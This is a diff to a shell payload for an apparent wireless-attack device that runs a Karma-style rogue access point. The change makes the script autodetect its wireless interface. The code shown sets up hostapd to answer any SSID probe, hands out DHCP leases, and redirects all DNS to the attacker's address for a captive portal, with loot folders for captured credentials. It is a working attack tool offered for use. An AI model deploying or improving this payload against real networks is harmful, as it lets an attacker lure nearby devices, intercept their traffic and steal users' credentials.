@@ -4,6 +4,11 @@
 # Description: Rogue AP that responds to all probe requests
 # Category: nullsec
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec"
 mkdir -p "$LOOT_DIR"/{karma,creds,logs}
 
@@ -18,10 +23,10 @@ captive portal.
 Press OK to configure."
 
 # Need both interfaces
-if [ ! -d "/sys/class/net/wlan0" ]; then
-    ERROR_DIALOG "wlan0 not found!
+if [ ! -d "/sys/class/net/$IFACE" ]; then
+    ERROR_DIALOG "$IFACE not found!
     
-Need wlan0 for AP mode."
+Need $IFACE for AP mode."
     exit 1
 fi
 
@@ -66,7 +71,7 @@ killall hostapd dnsmasq 2>/dev/null
 LOG "Starting rogue AP..."
 
 cat > /tmp/karma_hostapd.conf << EOF
-interface=wlan0
+interface=$IFACE
 driver=nl80211
 ssid=$SSID
 hw_mode=g
@@ -81,11 +86,11 @@ HOSTAPD_PID=$!
 sleep 2
 
 # Configure IP
-ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up
+ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up
 
 # Start DHCP
 cat > /tmp/karma_dnsmasq.conf << EOF
-interface=wlan0
+interface=$IFACE
 dhcp-range=10.0.0.10,10.0.0.100,12h
 address=/#/10.0.0.1
 EOF
